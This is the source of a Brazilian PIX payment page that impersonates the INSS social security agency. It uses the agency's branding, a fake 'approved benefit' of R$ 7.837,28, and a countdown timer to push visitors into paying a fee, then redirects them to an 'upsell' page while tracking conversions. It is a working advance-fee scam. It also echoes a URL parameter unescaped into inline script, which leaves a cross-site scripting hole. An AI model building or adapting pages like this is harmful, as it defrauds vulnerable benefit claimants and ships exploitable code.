
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>inss.gov.br | Pagamento PIX</title>
    <link rel="shortcut icon" href="public/assets/images/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="../style.css">
    <script src="https://cdn.tailwindcss.com"></script>
 <script>
  window.pixelId = "6811abfbce7f46f751dac6c8";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
      <script
        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
        data-utmify-prevent-subids
        data-utmify-ignore-iframe
        async
        defer
      ></script>
      <script>
        !function(f,b,e,v,n,t,s)
        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
        n.queue=[];t=b.createElement(e);t.async=!0;
        t.src=v;s=b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t,s)}(window, document,'script',
        'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '1367280367744436');
        fbq('track', 'PageView');
        </script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'govbr-blue': '#1351B4',
                        'govbr-yellow': '#FFCD07',
                        'govbr-green': '#168821',
                        'govbr-gray': '#F8F8F8',
                        'govbr-dark': '#071D41',
                        'govbr-dark-blue': '#071D41'
                    },
                    fontFamily: {
                        'rawline': ['Rawline', 'sans-serif']
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        
        body {
            font-family: 'Rawline', 'Raleway', sans-serif;
            background-color: #F8F8F8;
            color: #333;
            overflow-x: hidden;
            width: 100%;
            position: relative;
            margin: 0;
            padding: 0;
        }
        
        html {
            overflow-x: hidden;
            width: 100%;
        }
        
        .govbr-container {
            max-width: 600px;
            margin: 0 auto;
        }
        
        .govbr-header {
            background-color: var(--govbr-dark-blue);
            border-bottom: 2px solid var(--govbr-yellow);
        }
        
        .govbr-button {
            background-color: #1351B4;
            transition: all 0.3s ease;
            color: white;
            font-weight: 600;
            border: 2px solid white;
            border-radius: 4px;
            padding: 10px 16px;
            text-transform: uppercase;
            font-size: 14px;
            letter-spacing: 0.5px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .govbr-button:hover {
            background-color: #0D3B8B;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
        }
        
        .govbr-outline-button {
            border: 2px solid #1351B4;
            color: #1351B4;
            transition: all 0.3s ease;
        }
        
        .govbr-outline-button:hover {
            background-color: #1351B4;
            color: white;
        }
        
        .govbr-card {
            border-radius: 4px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
        }
        
        .govbr-input {
            border: 2px solid #DDDDDD;
            border-radius: 4px;
            padding: 12px;
            font-size: 16px;
            width: 100%;
            background-color: #F8F8F8;
        }
        
        .govbr-input:disabled {
            background-color: #EFEFEF;
            color: #555;
        }
        
        .govbr-badge {
            background-color: #168821;
            color: white;
            padding: 4px 12px;
            border-radius: 16px;
            font-weight: 500;
            font-size: 14px;
        }
        
        .govbr-timer {
            color: #FF3333;
            font-weight: bold;
        }
        
        .govbr-loading {
            border-top-color: #1351B4;
        }
        
        .govbr-success-icon {
            color: #168821;
        }
        
        .pulse-animation {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.05);
            }
            100% {
                transform: scale(1);
            }
        }
        
        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .valor-aprovado-container {
            background-color: #F8F8F8;
            border-left: 4px solid #1351B4;
            padding: 12px;
            margin: 16px 0;
            text-align: left;
        }
        
        .valor-aprovado-label {
            font-size: 14px;
            color: #555;
            margin-bottom: 4px;
            font-weight: 500;
        }
        
        .valor-aprovado {
            color: #1351B4;
            font-size: 28px;
            font-weight: bold;
            display: block;
        }

        /* Adiciona estilos para o popup de notificação */
        .notification-popup {
            position: fixed;
            top: 20px;
            right: -300px;
            background-color: #168821;
            color: white;
            padding: 16px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            z-index: 1000;
            transition: right 0.3s ease-in-out;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .notification-popup.show {
            right: 20px;
  }
</style>
</head>

<body class="min-h-screen">
    <noscript><img height="1" width="1" style="display:none"
        src="https://www.facebook.com/tr?id=1367280367744436&ev=PageView&noscript=1"
        /></noscript>
        
            <div id="notification" class="notification-popup">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
        </svg>
        <span>Código PIX copiado!</span>
    </div>
    <!-- Header do inss.gov.br -->
    <header class="govbr-header flex px-4 h-16 items-center drop-shadow-md">
        <a href="index.html">
            <img src="https://logodownload.org/wp-content/uploads/2014/01/inss-logo.png" alt="inss.gov.br" width="150">
        </a>
        <div class="ml-auto">
        </div>
    </header>

    <!-- Barra amarela característica do inss.gov.br -->
    <div class="h-1 bg-blue-400 w-full"></div>

    <div id="loadingPage" class="main-content hidden fade-in">
        <div class="p-8 text-center govbr-card bg-white max-w-md mx-auto mt-10">
            <h1 class="text-2xl font-bold mb-6 text-gray-800">
                Gerando Guia de Pagamento
            </h1>
            <div class="flex justify-center items-center mb-4">
                <div class="w-16 h-16 border-t-4 border-blue-600 border-solid rounded-full animate-spin"></div>
            </div>
            <p id="loadingMessage" class="text-lg text-gray-700">
                Aguarde...
            </p>
        </div>
    </div>

    <main id="loginPage" class="flex flex-col h-full gap-2 mt-10 rounded-md bg-white shadow-md w-96 py-4 mx-auto lg:w-1/3 govbr-card fade-in">
        <!-- Cabeçalho com informações do serviço -->
        <div class="px-6 py-3 bg-gray-100 border-b border-gray-200 flex items-center justify-between">
            <div>
                <h2 class="text-lg font-medium text-gray-800">Pagamento PIX</h2>
                <p class="text-xs text-gray-500">inss.gov.br</p>
            </div>
            <div class="bg-yellow-500 text-xs font-medium px-2 py-1 rounded text-white">
                Aguardando
            </div>
        </div>

        <!-- Valor aprovado em formato mais profissional -->
        <!-- Valor aprovado em formato mais profissional -->
        <div class="valor-aprovado-container mx-6" 
        <?php
        $upsell = $_GET['upsell'];
       if (!$upsell) {
        echo 'style="display:none;"';
       }
         ?>
        
        >
        
            <div class="valor-aprovado-label">Valor aprovado:</div>
            <div class="valor-aprovado">R$ 7.837,28</div>
            <div class="timer mt-2 flex items-center">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                Expira em: <span id="timer" class="font-bold ml-1">15:00</span>
            </div>
 
           </div>


        <div class="bg-blue-600 py-3 px-6 text-white">
            <p class="text-base">
                <strong>IMPORTANTE:</strong> Efetue o pagamento via Pix dentro do prazo estipulado para que possamos <strong>liberar seu benefício sem atrasos</strong>. Este é o último passo para assegurar o valor que é seu por direito.
            </p>
        </div>

        <div class="px-6 pt-4">
            <div class="flex flex-col gap-2 w-full justify-center items-center">
                <div id="imagemContainer" class="bg-white p-4 rounded-lg shadow-sm border border-gray-200 cursor-pointer hover:bg-gray-50 transition-colors group relative" style="min-height: 250px; display: flex; align-items: center; justify-content: center;" onclick="document.getElementById('copiar-codigo').click()">
                    <div class="absolute inset-0 flex items-center justify-center opacity-0 group-hover:opacity-100 bg-black bg-opacity-50 transition-opacity rounded-lg">
                        <span class="text-white text-sm font-medium">Clique para copiar o código PIX</span>
                    </div>
                    <!-- QR Code será inserido aqui via JavaScript -->
                    <div class="text-center text-gray-500">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 mx-auto mb-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1zM5 20h2a1 1 0 001-1v-2a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1z" />
                        </svg>
                        <p>Carregando QR Code...</p>
                    </div>
                </div>
            </div>

            <p class="text-sm font-medium mt-4 text-gray-700">
                Para efetuar o pagamento, leia o código QR ou
                copie o código abaixo e selecione a opção "copia e cola" no
                aplicativo do seu banco.
            </p>

            <div class="mt-4 bg-gray-50 p-3 rounded-md border border-gray-200">
                <label for="codigo-input" class="block text-xs font-medium text-gray-500 mb-1">
                    Código PIX para cópia:
                </label>
                <input id="codigo-input" type="text" disabled="" class="text-sm font-semibold border border-gray-300 py-2 px-2 w-full rounded bg-white text-gray-700">
                <p class="text-xs text-gray-500 mt-1">Clique no QR Code ou no botão abaixo para copiar</p>
            </div>
            
            <button id="copiar-codigo" class="govbr-button w-full py-3 mt-4 flex items-center justify-center">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
                </svg>
                COPIAR CÓDIGO PIX
            </button>
            
            <div class="text-center mt-4">
                <div class="inline-flex items-center text-sm text-gray-600">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                    </svg>
                    Pagamento processado com segurança pelo inss.gov.br
                </div>
            </div>
            
            <p class="text-sm text-gray-600 mt-4 text-center border-t border-gray-200 pt-4">
                Ao efetuar o pagamento, aguarde a confirmação nesta página.
            </p>
        </div>
    </main>

    <!-- Nova div para pagamento confirmado -->
    <div id="pagamentoConfirmado" class="hidden flex flex-col h-full gap-2 mt-10 rounded-md bg-white shadow-md w-96 py-2 mx-auto lg:w-1/3 govbr-card fade-in">
        <div class="bg-green-600 rounded-t-md py-3 px-6 text-white">
            <h1 class="text-2xl font-bold">Pagamento Confirmado!</h1>
        </div>
        <div class="px-6 pt-4">
            <div class="flex flex-col gap-4 items-center justify-center py-8">
                <svg class="w-20 h-20 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                </svg>
                <p class="text-lg font-bold">Sua indenização será creditada em breve</p>
                <div class="bg-gray-100 p-4 rounded-md w-full mt-4">
                    <div class="flex justify-between items-center mb-2">
                        <span class="text-sm text-gray-600">Valor:</span>
                        <span class="font-bold">R$ 5.960,50</span>
                    </div>
                    <div class="flex justify-between items-center mb-2">
                        <span class="text-sm text-gray-600">Data:</span>
                        <span id="data-pagamento">00/00/0000</span>
                    </div>
                    <div class="flex justify-between items-center">
                        <span class="text-sm text-gray-600">Protocolo:</span>
                        <span id="protocolo-pagamento">GOV-2023-5960</span>
                    </div>
                </div>
                <p class="text-sm text-gray-600 mt-4">Agradecemos por utilizar os serviços do inss.gov.br</p>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const loadingPage = document.getElementById('loadingPage');
            const loginPage = document.getElementById('loginPage');
            const imagemContainer = document.getElementById('imagemContainer');
            const codigoInput = document.getElementById('codigo-input');
            const copiarCodigo = document.getElementById('copiar-codigo');
            const pagamentoConfirmado = document.getElementById('pagamentoConfirmado');
            
            // Configurar data atual no comprovante
            const dataAtual = new Date();
            const dataFormatada = dataAtual.toLocaleDateString('pt-BR');
            document.getElementById('data-pagamento').textContent = dataFormatada;
            
            // Configurar protocolo aleatório
            const protocolo = 'GOV-' + Math.floor(Math.random() * 1000000);
            document.getElementById('protocolo-pagamento').textContent = protocolo;
            
            // Timer regressivo
            let tempoRestante = 15 * 60; // 15 minutos em segundos
            const timerElement = document.getElementById('timer');
            
            function atualizarTimer() {
                const minutos = Math.floor(tempoRestante / 60);
                const segundos = tempoRestante % 60;
                timerElement.textContent = `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
                
                if (tempoRestante <= 0) {
                    clearInterval(timerInterval);
                    timerElement.textContent = "Expirado";
                } else {
                    tempoRestante--;
                }
            }
            
            const timerInterval = setInterval(atualizarTimer, 1000);
            atualizarTimer();

            // Função para verificar status do pagamento
            async function verificarStatus() {
                try {
                    console.log('[Verificação] Verificando status do pagamento...');
                    const response = await fetch('verificar.php?id=' + window.paymentId);
                    const responseText = await response.text();
                    console.log('[Verificação] Resposta bruta:', responseText);

                    let data;
                    try {
                        data = JSON.parse(responseText);
                        console.log('[Verificação] Status do pagamento:', data);
                    } catch (jsonError) {
                        console.error('[Verificação] Erro ao parsear JSON:', jsonError);
                        console.error('[Verificação] Texto recebido:', responseText);
                        return;
                    }

                    if (data.status === "PAID" || data.status === "APPROVED" || data.status === "paid" || data.status === "approved") {
                        console.log('[Verificação] Pagamento aprovado! Status:', data.status);
                        console.log('[Verificação] Preparando redirecionamento...');
                        
                        // Dispara evento de compra para o Meta Pixel
                        if (typeof fbq === 'function') {
                            fbq('track', 'Purchase', {
                                value: 6190,
                                currency: 'BRL',
                                transaction_id: data.transaction_id
                            });
                        }

                        // Prepara os dados da transação para enviar
                        const transactionData = {
                            orderId: data.transaction_id,
                            status: data.status,
                            amount: 6190,
                            createdAt: new Date().toISOString(),
                            approvedDate: new Date().toISOString(),
                            customer: data.data.customer || {
                                name: 'Cliente',
                                email: 'cliente@email.com',
                                document: data.data.cpf || ''
                            },
                            fee: data.data.fee || { fixedAmount: 0 }
                        };

                        console.log('[Verificação] Dados da transação:', transactionData);

                        // Codifica os dados em base64
                        const transactionBase64 = btoa(JSON.stringify(transactionData));
                        console.log('[Verificação] Dados codificados em base64');

                        // Recupera os parâmetros UTM atuais
                        const urlParams = new URLSearchParams(window.location.search);
                        const utmParams = {
                            utm_source: urlParams.get('utm_source') || '',
                            utm_medium: urlParams.get('utm_medium') || '',
                            utm_campaign: urlParams.get('utm_campaign') || '',
                            utm_content: urlParams.get('utm_content') || '',
                            utm_term: urlParams.get('utm_term') || '',
                            xcod: urlParams.get('xcod') || '',
                            sck: urlParams.get('sck') || ''
                        };

                        console.log('[Verificação] Parâmetros UTM:', utmParams);

                        // Constrói a URL com os parâmetros
                        const redirectUrl = new URL('/upsell1/', window.location.origin);
                        redirectUrl.searchParams.append('transaction', transactionBase64);
                        Object.entries(utmParams).forEach(([key, value]) => {
                            if (value) redirectUrl.searchParams.append(key, value);
                        });

                        console.log('[Verificação] URL de redirecionamento:', redirectUrl.toString());

                        // Redireciona para a página de pagamento concluído
                        console.log('[Verificação] Iniciando redirecionamento...');
                        window.location.href = redirectUrl.toString();
                        clearInterval(window.statusInterval);
                    } else {
                        console.log('[Verificação] Aguardando pagamento...');
                    }
                } catch (error) {
                    console.error('[Verificação] Erro ao verificar status:', error);
                }
            }

            // Função para iniciar o pagamento
            async function iniciarPagamento() {
                try {
                    console.log('[Pagamento] Iniciando processo de pagamento...');
                    loadingPage.classList.remove('hidden');
                    loginPage.classList.add('hidden');

                    // Captura os parâmetros UTM da URL
                    const urlParams = new URLSearchParams(window.location.search);
                    const utmData = {
                        utm_source: urlParams.get('utm_source') || '',
                        utm_medium: urlParams.get('utm_medium') || '',
                        utm_campaign: urlParams.get('utm_campaign') || '',
                        utm_content: urlParams.get('utm_content') || '',
                        utm_term: urlParams.get('utm_term') || '',
                        xcod: urlParams.get('xcod') || '',
                        sck: urlParams.get('sck') || ''
                    };

                    console.log('[Pagamento] Parâmetros UTM capturados:', utmData);

                    const formData = new FormData();
                    formData.append('nome', 'Cliente');
                    formData.append('email', 'cliente@exemplo.com');
                    formData.append('telefone', '11999999999');
                    
                    // Adiciona os parâmetros UTM ao FormData
                    Object.entries(utmData).forEach(([key, value]) => {
                        formData.append(key, value);
                    });

                    console.log('[Pagamento] Enviando requisição para pagamento.php...');
                    const response = await fetch('pagamento.php?valor=<?php
                     $valor = $_GET['valor'];
                     echo $valor ;
                     ?>', {
                        method: 'POST',
                        body: formData
                    });

                    console.log('[Pagamento] Status da resposta:', response.status);
                    const responseText = await response.text();
                    console.log('[Pagamento] Resposta bruta:', responseText);

                    let data;
                    try {
                        data = JSON.parse(responseText);
                        console.log('[Pagamento] Dados processados:', data);
                    } catch (jsonError) {
                        console.error('[Pagamento] Erro ao parsear JSON:', jsonError);
                        console.error('[Pagamento] Texto recebido:', responseText);
                        throw new Error('Resposta inválida do servidor');
                    }

                    if (data.success) {
                        console.log('[Pagamento] QR Code gerado com sucesso');
                        window.paymentId = data.token; // Salva o ID do pagamento
                        
                        // Atualiza o input com o código PIX
                        const codigoInput = document.getElementById('codigo-input');
                        codigoInput.value = data.pixCopiaECola;

                        // Função para tentar serviços alternativos de QR code
                        const tryQRService = async (pixCode, attempt = 1) => {
                            const services = [
                                (code) => `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(code)}&size=300x300&charset-source=UTF-8&charset-target=UTF-8&qzone=1&format=png&ecc=L`,
                                (code) => `https://chart.googleapis.com/chart?cht=qr&chs=300x300&chl=${encodeURIComponent(code)}`,
                                (code) => `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(code)}`
                            ];

                            if (attempt > services.length) {
                                throw new Error('Todos os serviços de QR code falharam');
                            }

                            return new Promise((resolve, reject) => {
                                const img = new Image();
                                img.onload = () => resolve(img);
                                img.onerror = () => {
                                    console.log(`[Pagamento] Tentativa ${attempt} falhou, tentando próximo serviço...`);
                                    tryQRService(pixCode, attempt + 1)
                                        .then(resolve)
                                        .catch(reject);
                                };
                                img.src = services[attempt - 1](pixCode);
                            });
                        };

                        try {
                            const qrImage = await tryQRService(data.pixCode);
                            imagemContainer.innerHTML = '';
                            qrImage.className = 'max-w-[300px] bg-white p-4 rounded-lg mx-auto';
                            imagemContainer.appendChild(qrImage);
                        } catch (error) {
                            console.error('[Pagamento] Erro ao carregar QR code:', error);
                            imagemContainer.innerHTML = `
                                <div class="text-center">
                                    <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
                                        <div class="flex">
                                            <div class="flex-shrink-0">
                                                <svg class="h-5 w-5 text-yellow-400" viewBox="0 0 20 20" fill="currentColor">
                                                    <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
                                                </svg>
                                            </div>
                                            <div class="ml-3">
                                                <p class="text-sm text-yellow-700">
                                                    Não foi possível carregar o QR Code. Use o código PIX abaixo para pagar.
                                                </p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            `;
                        }
                        
                        codigoInput.value = data.pixCode;
                        iniciarVerificacaoStatus();
                    } else {
                        console.error('[Pagamento] Erro ao gerar pagamento:', data.message);
                        imagemContainer.innerHTML = `
                            <div class="text-center text-red-500">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 mx-auto mb-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                                </svg>
                                <p>Erro ao gerar QR Code. Por favor, atualize a página.</p>
                            </div>
                        `;
                    }
                } catch (error) {
                    console.error('[Pagamento] Erro ao processar pagamento:', error);
                    imagemContainer.innerHTML = `
                        <div class="text-center text-red-500">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 mx-auto mb-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                            <p>Erro ao processar pagamento. Por favor, tente novamente mais tarde.</p>
                        </div>
                    `;
                } finally {
                    loadingPage.classList.add('hidden');
                    loginPage.classList.remove('hidden');
                }
            }

            // Função para iniciar verificação periódica do status
            function iniciarVerificacaoStatus() {
                console.log('Iniciando verificação periódica do status...');
                if (window.statusInterval) {
                    clearInterval(window.statusInterval);
                }
                window.statusInterval = setInterval(verificarStatus, 7000);
            }

            // Adiciona feedback visual ao copiar
            const feedbackCopia = (elemento) => {
                const notification = document.getElementById('notification');
                notification.classList.add('show');
                
                setTimeout(() => {
                    notification.classList.remove('show');
                }, 2000);
            };

            // Função para copiar o código PIX
            const copiarCodigoPix = async () => {
                const codigoInput = document.getElementById('codigo-input');
                try {
                    await navigator.clipboard.writeText(codigoInput.value);
                    console.log('[Pagamento] Código PIX copiado com sucesso');
                    feedbackCopia(document.querySelector('#copiar-codigo'));
                } catch (err) {
                    console.error('[Pagamento] Erro ao copiar código:', err);
                    alert('Não foi possível copiar o código automaticamente. Por favor, copie manualmente.');
                }
            };

            // Adiciona evento de clique ao botão de copiar
            document.getElementById('copiar-codigo').addEventListener('click', copiarCodigoPix);

            // Iniciar pagamento automaticamente
            console.log('Iniciando processo...');
            iniciarPagamento();
        });
    </script>
<script
src="https://cdn.utmify.com.br/scripts/utms/latest.js"
data-utmify-prevent-xcod-sck
data-utmify-prevent-subids
async
defer
></script>

<!-- Pixel Code - https://app.analyeasy.com/ -->
<script defer src="https://app.analyeasy.com/pixel/OQz6HEXqRwcQ8yNg"></script>
<!-- END Pixel Code -->
</body>
</html>